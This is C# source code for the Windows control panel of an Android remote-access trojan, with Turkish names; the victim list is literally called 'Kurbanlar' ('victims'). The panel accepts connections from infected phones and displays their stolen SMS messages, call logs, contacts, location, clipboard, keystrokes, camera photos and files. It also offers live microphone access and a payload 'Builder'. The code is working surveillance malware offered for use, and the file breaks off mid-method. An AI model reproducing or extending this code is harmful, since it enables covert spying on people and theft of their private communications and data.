using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Form1 : Form
    {
        List<Kurbanlar> kurban_listesi = new List<Kurbanlar>();
        Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            if (new Port().ShowDialog() == DialogResult.OK)
            {
                Dinle();
            }
            else
            {
                Environment.Exit(0);
            }
            dizin_yukari.ImageIndex = 13;
            dizin_yukari_.ImageIndex = 13;
        }
        public static int port_no = 9999;
        public void Dinle()
        {
            try
            {
                soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                soketimiz.NoDelay = true;
                soketimiz.SendBufferSize = int.MaxValue; soketimiz.ReceiveBufferSize = int.MaxValue;
                soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
                toolStripStatusLabel1.Text = "Port: " + port_no.ToString();
                soketimiz.Listen(int.MaxValue);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public async void infoAl(Socket sckInf)
        {
            try
            {
                if (!sckInf.Connected)
                {
                    listBox1.Items.Add(sckInf.Handle.ToString() +
                    " kimlik numaralı sokete bağlanılamadı."); return;
                }
                await Task.Run(() =>
                {
                    NetworkStream networkStream = new NetworkStream(sckInf);
                    StringBuilder sb = new StringBuilder();
                    int thisRead = 0;
                    int blockSize = 2048;
                    byte[] dataByte = new byte[blockSize];
                    lock (this)
                    {
                        while (true)
                        {
                            thisRead = networkStream.ReadAsync(dataByte, 0, blockSize).Result;
                            sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                            if (sb.ToString().Trim().EndsWith("<EOF>"))
                            {
                                Client_Bilgi_Al(sckInf, sb.ToString().Replace("<EOF>", ""));
                                sb.Clear();
                            }
                        }
                    }
                });
            }
            catch (Exception) { }
        }
        public static async void KomutGonder(string tag, string mesaj, Socket client)
        {
            using (NetworkStream ns = new NetworkStream(client))
            {
                byte[] cmd = Encoding.UTF8.GetBytes(tag + mesaj + "<EOF>");
                await ns.WriteAsync(cmd, 0, cmd.Length);
            }
        }
        public void Client_Kabul(IAsyncResult ar)
        {
            try
            {
                Socket sock = soketimiz.EndAccept(ar);
                infoAl(sock);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public static int topOf = 0;

        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver)
        {
            socettte.NoDelay = true;
            socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            kurban_listesi.Add(new Kurbanlar(socettte, idimiz));
            ListViewItem lvi = new ListViewItem(idimiz);
            lvi.SubItems.Add(makine_ismi);
            lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
            lvi.SubItems.Add(ulke_dil);
            lvi.SubItems.Add(uretici_model.ToUpper());
            lvi.SubItems.Add(android_ver);

            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png"))
            {
                lvi.ImageKey = ulke_dil.Split('/')[1] + ".png";
            }
            else
            {
                lvi.ImageIndex = 0;
            }
            listView1.Items.Add(lvi);
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png"))
            {
                new Bildiri(makine_ismi, uretici_model, android_ver,
                Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png")).Show();
            }
            else
            {
                new Bildiri(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png")).Show();
            }
            toolStripStatusLabel2.Text = "Online: " + listView1.Items.Count.ToString();
            await Task.Delay(1);
            topOf += 125;

        }

        ListViewItem dizin_yukari = new ListViewItem("...");
        ListViewItem dizin_yukari_ = new ListViewItem("...");
        public void Client_Bilgi_Al(Socket soket2, string data)
        {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                    switch (s[0])
                    {
                        case "IP":
                            Invoke((MethodInvoker)delegate
                            {
                                Ekle(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                            });
                            break;
                        case "CAMNOT":
                            Invoke((MethodInvoker)delegate
                            {
                                FİndKameraById(soket2.Handle.ToString()).label2.Text = "Çekilemedi.";
                                FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                                FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                            });
                            break;
                        case "SMSLOGU":
                            try
                            {
                                string ok = s[1];
                                FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Clear();
                                if (ok != "SMS YOK")
                                {
                                    string[] ana_Veriler = ok.Split('&');
                                    for (int k = 0; k < ana_Veriler.Length; k++)
                                    {
                                        try
                                        {
                                            string[] bilgiler = ana_Veriler[k].Split('{');
                                            ListViewItem item = new ListViewItem(bilgiler[0]);
                                            item.ImageIndex = 0;
                                            item.SubItems.Add(bilgiler[4]);
                                            item.SubItems.Add(bilgiler[1]);
                                            item.SubItems.Add(bilgiler[2]);
                                            item.SubItems.Add(bilgiler[3]);
                                            FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                        }
                                        catch (Exception) { }
                                    }
                                }
                                else
                                {
                                    ListViewItem item = new ListViewItem("SMS Yok.");
                                    FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                            }
                            catch (Exception ex) { FindSMSFormById(soket2.Handle.ToString()).Text = "Sms Yöneticisi " + ex.Message; }
                            break;
                        case "CAGRIKAYITLARI":
                            try
                            {
                                string ok__ = s[1];
                                FindCagriById(soket2.Handle.ToString()).listView1.Items.Clear();
                                if (ok__ != "CAGRI YOK")
                                {
                                    string[] ana_Veriler = ok__.Split('&');
                                    for (int k = 0; k < ana_Veriler.Length; k++)
                                    {
                                        try
                                        {
                                            string[] bilgiler = ana_Veriler[k].Split('=');
                                            ListViewItem item = new ListViewItem(bilgiler[0]);
                                            item.SubItems.Add(bilgiler[1]);
                                            item.SubItems.Add(bilgiler[2]);
                                            item.SubItems.Add(bilgiler[3]);
                                            item.SubItems.Add(bilgiler[4]);
                                            switch (bilgiler[4])
                                            {
                                                case "GELEN_TELEFON":
                                                    item.ImageIndex = 1;
                                                    break;
                                                case "GİDEN_TELEFON":
                                                    item.ImageIndex = 3;
                                                    break;
                                                case "CEVAPSIZ_ARAMA":
                                                    item.ImageIndex = 2;
                                                    break;
                                                case "REDDEDİLMİŞ_ARAMA":
                                                    item.ImageIndex = 0;
                                                    break;
                                                case "KARA_LİSTE_ARAMA":
                                                    item.ImageIndex = 0;
                                                    break;
                                            }
                                            FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                        }
                                        catch (Exception) { }
                                    }
                                }
                                else
                                {
                                    ListViewItem item = new ListViewItem("Çağrı Yok.");
                                    FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                            }
                            catch (Exception ex) { FindCagriById(soket2.Handle.ToString()).Text = "Çağrı Kayıtları " + ex.Message; }
                            break;
                        case "REHBER":
                            try
                            {
                                string _ok = s[1];
                                FindRehberById(soket2.Handle.ToString()).listView1.Items.Clear();
                                if (_ok != "REHBER YOK")
                                {
                                    string[] ana_Veriler = _ok.Split('&');
                                    for (int k = 0; k < ana_Veriler.Length; k++)
                                    {
                                        try
                                        {
                                            string[] bilgiler = ana_Veriler[k].Split('=');
                                            ListViewItem item = new ListViewItem(bilgiler[0]);
                                            item.ImageIndex = 0;
                                            item.SubItems.Add(bilgiler[1]);
                                            FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                        }
                                        catch (Exception) { }
                                    }
                                }
                                else
                                {
                                    ListViewItem item = new ListViewItem("Rehber Yok.");
                                    FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                            }
                            catch (Exception ex) { FindRehberById(soket2.Handle.ToString()).Text = "Rehber " + ex.Message; }
                            break;
                        case "APPS":
                            FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Clear();
                            string[] ana_Veriler_ = s[1].Split(new[] { "[REMIX]" }, StringSplitOptions.None);
                            for (int k = 0; k < ana_Veriler_.Length; k++)
                            {
                                try
                                {
                                    string[] bilgiler = ana_Veriler_[k].Split(new[] { "[HANDSUP]" }, StringSplitOptions.None);
                                    ListViewItem item = new ListViewItem(bilgiler[0]);
                                    item.SubItems.Add(bilgiler[1]);
                                    if (bilgiler[2] != "[NULL]")
                                    {
                                        try
                                        {
                                            FindUygulamalarById(soket2.Handle.ToString()).ımageList1.Images.Add(bilgiler[1],
                                                (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(bilgiler[2])));
                                            item.ImageKey = bilgiler[1];
                                        }
                                        catch (Exception ex) { MessageBox.Show(ex.Message); }
                                    }
                                    FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                                catch (Exception) { }
                            }
                            break;
                        case "DOSYAALINDI":
                            FindFileManagerById(soket2.Handle.ToString()).timer1.Enabled = false; FindFileManagerById(soket2.Handle.ToString()).count = 0;
                            FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi";
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "İsimli kurbanınızda dosya başarılı bir şekilde kaydedildi.", s[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        case "WEBCAM":
                            try
                            {

                                FİndKameraById(soket2.Handle.ToString()).label2.Text = "Çekildi.";
                                byte[] resim = Convert.FromBase64String(s[1]);
                                using (MemoryStream ms = new MemoryStream(resim))
                                {
                                    FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                }
                                FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(FİndKameraById(soket2.Handle.ToString()), ex.Message);
                                FİndKameraById(soket2.Handle.ToString()).Text = "Kamera " + ex.Message;
                            }
                            break;
                        case "FILES":
                            try
                            {
                                switch (s[1])
                                {
                                    case "IKISIDE":
                                        FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Clear();
                                        FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Clear();
                                        break;
                                    case "CIHAZ":
                                        FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Clear();

                                        break;
                                    case "SDCARD":
                                        FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Clear();
                                        break;
                                }

                                try { FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Add(dizin_yukari); } catch (Exception) { }
                                try { FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Add(dizin_yukari_); } catch (Exception) { }

                                if (s[2] == "BOS")
                                {
                                    switch (s[1])
                                    {
                                        case "IKISIDE":
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImage =
                                            Properties.Resources.nothing;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;
                                        case "CIHAZ":
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;
                                        case "SDCARD":
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;

                                    }
                                }
                                else
                                {
                                    string[] lines = s[2].Split('<');
                                    foreach (string line in lines)
                                    {
                                        string[] parse = line.Split('=');
                                        try
                                        {
                                            ListViewItem lv = new ListViewItem(parse[0]);
                                            lv.SubItems.Add(parse[1]);
                                            lv.SubItems.Add(parse[2]);
                                            lv.SubItems.Add(parse[3]);
                                            lv.SubItems.Add(parse[4]);
                                            if (parse[2] == "")
                                            {
                                                lv.ImageIndex = 0;
                                            }
                                            else
                                            {
                                                switch (parse[2].ToLower())
                                                {
                                                    case ".txt":
                                                        lv.ImageIndex = 11;
                                                        break;
                                                    case ".apk":
                                                        lv.ImageIndex = 1;
                                                        break;
                                                    case ".jpeg":
                                                    case ".jpg":
                                                    case ".png":
                                                    case ".gif":
                                                        lv.ImageIndex = 4;
                                                        break;
                                                    case ".avi":
                                                    case ".mp4":
                                                    case ".flv":
                                                    case ".mkv":
                                                    case ".wmv":
                                                    case ".mpg":
                                                    case ".mpeg":
                                                        lv.ImageIndex = 7;
                                                        break;
                                                    case ".mp3":
                                                    case ".wav":
                                                    case ".ogg":
                                                        lv.ImageIndex = 6;
                                                        break;
                                                    case ".rar":
                                                    case ".zip":
                                                        lv.ImageIndex = 8;
                                                        break;
                                                    case ".pdf":
                                                        lv.ImageIndex = 10;
                                                        break;
                                                    case ".html":
                                                    case ".htm":
                                                        lv.ImageIndex = 9;
                                                        break;
                                                    case ".doc":
                                                    case ".docx":
                                                        lv.ImageIndex = 2;
                                                        break;
                                                    case ".xlsx":
                                                        lv.ImageIndex = 3;
                                                        break;
                                                    case ".pptx":
                                                        lv.ImageIndex = 5;
                                                        break;
                                                    default:
                                                        lv.ImageIndex = 12;
                                                        break;
                                                }
                                            }

                                            if (parse[4] == "CİHAZ")
                                            {
                                                FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Add(lv);
                                                FindFileManagerById(soket2.Handle.ToString()).textBox1.Text = parse[5];

                                            }
                                            else
                                            {
                                                if (parse[4] == "SDCARD")
                                                {
                                                    FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Add(lv);
                                                    FindFileManagerById(soket2.Handle.ToString()).textBox2.Text = parse[5];

                                                }
                                            }
                                        }
                                        catch (Exception)
                                        {
                                            //MessageBox.Show(ex.StackTrace);
                                            //FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi - Hata: " + ex.Message;
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi " + ex.Message;
                            }
                            break;
                        case "UZUNLUK":
                            string dosyaAdi = s[2];
                            if (!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]))
                            {
                                Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]);
                            }
                            try
                            {
                                File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3] + "\\"
                                    + s[2], Convert.FromBase64String(s[1]));
                            }
                            catch (Exception ex) { MessageBox.Show(ex.Message); }
                            FindFileManagerById(soket2.Handle.ToString()).timer1.Enabled = false; FindFileManagerById(soket2.Handle.ToString()).count = 0;
                            FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi";
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "Dosya indi", "İndirme Tamamlandı", MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                            break;
                        case "CHAR":
                            try
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += s[1].Replace("[NEW_LINE]", Environment.NewLine)
                            + Environment.NewLine;
                            }
                            catch (Exception) { }
                            break;
                        case "LOGDOSYA":
                            try
                            {
                                if (s[1] == "LOG_YOK")
                                {
                                    FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("Log yok.");
                                }
                                else
                                {
                                    string ok = s[1];
                                    string[] ayristir = ok.Split('=');
                                    for (int i = 0; i < ayristir.Length; i++)
                                    {
                                        FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                                    }
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "KEYGONDER":
                            string ok_ = s[1];
                            FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = ok_.Replace("[NEW_LINE]", Environment.NewLine);
                            break;

                        case "SESBILGILERI":
                            string[] ayristir_ = s[1].Split('=');
                            try
                            {
                                FindAyarlarById(soket2.Handle.ToString()).trackBar1.Maximum = int.Parse(ayristir_[0].Split('/')[1]);
                                FindAyarlarById(soket2.Handle.ToString()).trackBar1.Value = int.Parse(ayristir_[0].Split('/')[0]);
                                FindAyarlarById(soket2.Handle.ToString()).groupBox1.Text = "Zil Sesi " + ayristir_[0];
                                //
                                if (ayristir_[0].Split('/')[0] == "0") { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = false; }
                                else { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = true; }
                                //
                                FindAyarlarById(soket2.Handle.ToString()).trackBar2.Maximum = int.Parse(ayristir_[1].Split('/')[1]);
                                FindAyarlarById(soket2.Handle.ToString()).trackBar2.Value = int.Parse(ayristir_[1].Split('/')[0]);
                                FindAyarlarById(soket2.Handle.ToString()).groupBox2.Text = "Medya " + ayristir_[1];
                                //
                                FindAyarlarById(soket2.Handle.ToString()).trackBar3.Maximum = int.Parse(ayristir_[2].Split('/')[1]);
                                FindAyarlarById(soket2.Handle.ToString()).trackBar3.Value = int.Parse(ayristir_[2].Split('/')[0]);
                                FindAyarlarById(soket2.Handle.ToString()).groupBox3.Text = "Bildirim " + ayristir_[2];
                                //
                                FindAyarlarById(soket2.Handle.ToString()).trackBar4.Value = int.Parse(ayristir_[3]);
                                FindAyarlarById(soket2.Handle.ToString()).groupBox4.Text = "Ekran parlaklığı " + ayristir_[3];

                            }
                            catch (Exception ex) { MessageBox.Show(ex.Message); }
                            break;
                        case "TELEFONBILGI":
                            var shorted = FindBilgiById(soket2.Handle.ToString());
                            FindBilgiById(soket2.Handle.ToString()).progressBar1.Value = int.Parse(s[1].Replace("%", ""));
                            FindBilgiById(soket2.Handle.ToString()).label1.Text = "%" + s[1];
                            FindBilgiById(soket2.Handle.ToString()).label2.Text = s[2].Split('&')[0];
                            FindBilgiById(soket2.Handle.ToString()).label3.Text = s[2].Split('&')[1];
                            FindBilgiById(soket2.Handle.ToString()).label4.Text = s[3];

                            FindBilgiById(soket2.Handle.ToString()).label5.Text = s[6];

                            FindBilgiById(soket2.Handle.ToString()).label6.Text = s[5];
                            FindBilgiById(soket2.Handle.ToString()).label7.Text = s[7];
                            shorted.label8.Text = s[8];
                            break;
                        case "PANOGELDI":
                            try
                            {
                                string icerik = s[1];
                                if (icerik != "[NULL]")
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = icerik;
                                }
                                else
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = string.Empty;
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "WALLPAPERBYTES":
                            try
                            {
                                FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image
                               = (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                            }
                            catch (Exception) { }
                            break;
                        case "LOCATION":
                            FindKonumById(soket2.Handle.ToString()).richTextBox1.Text = string.Empty;
                            string[] ayr = s[1].Split('=');
                            for (int i = 0; i < ayr.Length; i++)
                            {
                                if (ayr[i].Contains("{"))
                                {
                                    string[] url = ayr[i].Split('{');
                                    //http://maps.google.com/maps?q=24.197611,120.780512
                                    ayr[i] = $"http://maps.google.com/maps?q={url[0].Replace(','.ToString(), '.'.ToString())},{url[1].Replace(','.ToString(), '.'.ToString())}";
                                }
                                FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[i] + Environment.NewLine;
                            }
                            break;
                        case "ARAMA":
                            try
                            {
                                ListViewItem lvi = listView1.Items.Cast<ListViewItem>().Where(items => items.Text ==
                                soket2.Handle.ToString()).First();
                                if (FindAramaCount(soket2.Handle.ToString()) == 0)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        new YeniArama(s[1].Split('=')[1], s[1].Split('=')[0], lvi.SubItems[1].Text, soket2.Handle.ToString()).Show();
                                    });
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "INDIRILDI":
                            var window = FindDownloadManagerById(soket2.Handle.ToString());
                            MessageBox.Show(window, s[1], "Dosyanızın İndirtme Sonucu", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                    }
                }
                catch (Exception) { }
            }
        }
        FİleManager fmanger;
        private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Kamera msj = new Kamera(kurban.soket, kurban.id);
                    msj.Show();
                }
            }
        }
        // BENİM RAHAT ETMEDİĞİM DÜNYADA KİMSE İSTİRAHAT EDEMEZ.
        // https://www.youtube.com/watch?v=EOn9rRSdBNU
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurbanlar in kurban_listesi.ToList())
            {
                try
                {
                    kurbanlar.soket.Send(Encoding.UTF8.GetBytes("0x0F"));
                }
                catch (SocketException)
                {
                    listView1.Items.Cast<ListViewItem>().Where(y => y.Text == kurbanlar.id).First().Remove();
                    kurban_listesi.Where(x => x.id == kurbanlar.id).First().soket.Close();
                    kurban_listesi.Where(x => x.id == kurbanlar.id).First().soket.Dispose();
                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == kurbanlar.id).First());
                    toolStripStatusLabel2.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                }
            }
        }
        private void bağlantıyıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        fmanger = new FİleManager(kurban.soket, kurban.id);
                        fmanger.Show();
                        KomutGonder("DOSYA", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void masaustuİzleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Telefon tlf = new Telefon(kurban.soket, kurban.id);
                        tlf.Show();
                    }
                }
            }
        }
        private void canlıMikrofonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Mikrofon masaustu = new Mikrofon(kurban.soket);
                        masaustu.Show();
                    }
                }
            }
        }
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Keylogger keylog = new Keylogger(kurban.soket, kurban.id);
                        keylog.Show();
                        KomutGonder("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
        public int FindAramaCount(string ident)
        {
            var list = Application.OpenForms
          .OfType<YeniArama>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.Count();
        }
        public Telefon FindTelephonFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Telefon>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public Rehber FindRehberById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Rehber>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<SMSYoneticisi>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public FİleManager FindFileManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<FİleManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Keylogger>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Kamera FİndKameraById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Kamera>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public CagriKayitlari FindCagriById(string ident)
        {
            var list = Application.OpenForms
          .OfType<CagriKayitlari>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Ayarlar FindAyarlarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Ayarlar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Uygulamalar FindUygulamalarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Uygulamalar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Bilgiler FindBilgiById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Bilgiler>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Konum FindKonumById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Konum>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Eglence FindEglenceById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Eglence>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public DownloadManager FindDownloadManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<DownloadManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        private void sMSYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        SMSYoneticisi sMS = new SMSYoneticisi(kurban.soket, kurban.id);
                        sMS.Show();
                        KomutGonder("GELENKUTUSU", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void çağrıKayıtlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        CagriKayitlari sMS = new CagriKayitlari(kurban.soket, kurban.id);
                        sMS.Show();
                        KomutGonder("CALLLOGS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void telefonAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Ayarlar sMS = new Ayarlar(kurban.soket, kurban.id);
                        sMS.Show();
                        KomutGonder("VOLUMELEVELS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void rehberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Rehber sMS = new Rehber(kurban.soket, kurban.id);
                        sMS.Show();
                        KomutGonder("REHBERIVER", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void eğlencePaneliToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Eglence eglence = new Eglence(kurban.soket, kurban.id);
                        eglence.Show();
                    }
                }
            }
        }
        private void uygulamaListesiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Uygulamalar eglence = new Uygulamalar(kurban.soket, kurban.id);
                        eglence.Show();
                        KomutGonder("APPLICATIONS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void telefonDurumuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Bilgiler eglence = new Bilgiler(kurban.soket, kurban.id);
                        eglence.Show();
                        KomutGonder("SARJ", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void oluşturToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Builder().Show();
        }

        private void hakkındaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Hakkinda().Show();
        }

        private void konumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Konum knm = new Konum(kurban.soket, kurban.id);
                    knm.Show();
                    KomutGonder("KONUM", "[VERI][0x09]", kurban.soket);
                }
            }
        }

        private void ayarlarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Settings().Show();
        }

        private void dosyaİndirtToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
